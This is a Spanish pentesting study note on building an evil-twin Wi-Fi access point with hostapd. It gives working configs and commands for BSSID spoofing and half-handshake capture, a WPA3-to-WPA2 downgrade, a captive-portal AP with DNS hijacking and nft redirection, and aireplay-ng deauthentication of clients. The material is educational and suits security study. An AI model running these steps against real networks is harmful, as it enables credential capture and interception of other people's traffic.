---
tags:
  - Wi-Fi/Evil-Twin
  - Pentesting/Explotacion
Descripción: "Levantar un punto de acceso falso para capturar medio handshake, hacer downgrade de WPA3 o servir un portal, con la infraestructura de red que hace falta alrededor"
Fecha de actualización: 2026-08-04
Nota previa: "[[00 - hostapd y su configuración]]"
Nota siguiente: "[[02 - hostapd-mana]]"
Area: "[[hostapd.base|hostapd]]"
---
---

Un AP falso construido a mano con `hostapd` es más trabajo que usar `airgeddon` o `EAPHammer`, y a cambio da <mark style="background: #ADCCFFA6;">control exacto sobre lo que se anuncia</mark> — que es justo lo que hace falta en ataques como el downgrade de WPA3, donde la gracia está en ofrecer **menos** de lo que ofrece el AP real.

# Caso 1: capturar medio handshake

El objetivo no es que el cliente se conecte, sino que llegue hasta el segundo mensaje del 4-way handshake. La contraseña configurada es irrelevante:

```config
interface=wlan1
ssid=CorpWiFi
hw_mode=g
channel=6

wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
auth_algs=1
wpa_passphrase=noimportacual
```

```shell-session
$ sudo ip link set wlan1 down
$ sudo macchanger -m 9C:9A:03:39:BD:7A wlan1     # suplantar el BSSID real
$ sudo ip link set wlan1 up
$ sudo hcxdumptool -i wlan0 -c 6a -w medio.pcapng &
$ sudo hostapd hostapd.conf
```

La señal de éxito:

```text
wlan1: AP-STA-POSSIBLE-PSK-MISMATCH f2:7b:12:97:b2:e8
```

<mark style="background: #FFB86CA6;">Ese mensaje significa que el cliente completó M2 con **su** contraseña, que no coincide con la del AP falso</mark> — exactamente lo buscado. El material resultante se marca como `challenge`, con las implicaciones de verificación descritas en [[02 - El formato 22000 y los message pairs]].

# Caso 2: downgrade de WPA3

Idéntica configuración, con una diferencia conceptual: el AP real está en **modo transición** (anuncia PSK y SAE) y el falso ofrece **sólo PSK**. Los clientes compatibles con WPA3 aceptan la vía antigua porque es la única disponible.

Es el ataque de *Dragonblood* descrito en [[05 - WPA3 en modo transición y downgrade]]. Aquí `hostapd` es la herramienta correcta precisamente por lo que **no** hace: no negocia SAE, no anuncia capacidades de más, y el `hostapd.conf` deja constancia exacta de lo que se anunció — evidencia reproducible para el informe.

# Caso 3: AP abierto con portal

Un AP falso funcional necesita más que `hostapd`: hace falta direccionamiento, resolución de nombres y encaminamiento.

```mermaid
graph LR
    A["Cliente"] --> B["hostapd<br/>wlan1"]
    B --> C["dnsmasq<br/>DHCP + DNS"]
    C --> D["iptables/nft<br/>redirección"]
    D --> E["Portal web<br/>o salida a internet"]
```

```config
# dnsmasq.conf
interface=wlan1
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1          # todo el DNS resuelve al portal
```

```shell-session
$ sudo ip addr add 10.0.0.1/24 dev wlan1
$ sudo systemctl stop systemd-resolved          # libera el puerto 53
$ sudo dnsmasq -C dnsmasq.conf -d
$ sudo nft add table ip nat
$ sudo nft add chain ip nat prerouting '{ type nat hook prerouting priority -100 ; }'
$ sudo nft add rule ip nat prerouting iifname wlan1 tcp dport 80 redirect to :8080
```

> [!warning]+ El conflicto del puerto 53 es el fallo más frecuente
> `systemd-resolved` escucha en `127.0.0.53:53` y `dnsmasq` no puede arrancar. <mark style="background: #FF5582A6;">El síntoma es un AP que se levanta pero al que nadie consigue conectarse</mark>, porque no hay DHCP. Hay que pararlo antes y **restaurarlo al terminar**:
>
> ```shell-session
> $ sudo systemctl restart systemd-resolved NetworkManager
> ```

`nftables` es la sintaxis nativa desde Debian 10, RHEL 8 y Ubuntu 20.10; `iptables` sigue funcionando pero es una capa de traducción sobre él.

# Que el cliente elija tu AP

Un cliente asociado no cambia de AP porque aparezca otro con el mismo nombre. Las tres palancas, de menos a más ruidosa:

| Palanca | Cómo | Ruido |
| ------- | ---- | ----- |
| **Esperar** | El *roaming* natural al moverse por el edificio | Ninguno |
| **Más señal** | Acercarse; la potencia legal la fija el dominio regulatorio | Bajo, salvo `OVERPOWERED` |
| **Desautenticar** | `aireplay-ng -0 3 -a <bssid> -c <cliente>` | Alto: `DEAUTHFLOOD` |

<mark style="background: #8000E1A6;">Con `PMF` activo la tercera no funciona</mark>, así que sólo quedan las dos primeras — y la paciencia deja de ser una virtud para convertirse en el único método disponible. La disciplina completa está en [[12 - Detección y evasión en entorno corporativo]].

Sobre la potencia: subirla por encima del límite del dominio regulatorio con `iw reg set` es **ilegal** fuera de un laboratorio blindado, además de delatar al operador. El marco está en [[01 - Bandas, canales y regulación del espectro]].

# Depuración

```shell-session
$ sudo hostapd -dd hostapd.conf
$ sudo hostapd_cli -i wlan1 all_sta
$ sudo hostapd_cli -i wlan1 status
```

| Mensaje | Significado |
| ------- | ----------- |
| `AP-ENABLED` | El AP está emitiendo |
| `STA ... IEEE 802.11: authenticated` | Autenticación 802.11 (siempre tiene éxito en Open System) |
| `STA ... associated (aid N)` | El cliente se asoció |
| `AP-STA-POSSIBLE-PSK-MISMATCH` | **M2 recibido con otra contraseña** |
| `CTRL-EVENT-EAP-PROPOSED-METHOD` | Negociación EAP en curso |
| `rfkill: Cannot open RFKILL control device` | Aviso inocuo en contenedores |

Un cliente que se autentica y asocia pero **no** produce `PSK-MISMATCH` no está usando PSK: espera 802.1X. Ese diagnóstico es el que lleva a montar el AP Enterprise de [[02 - hostapd-mana]].
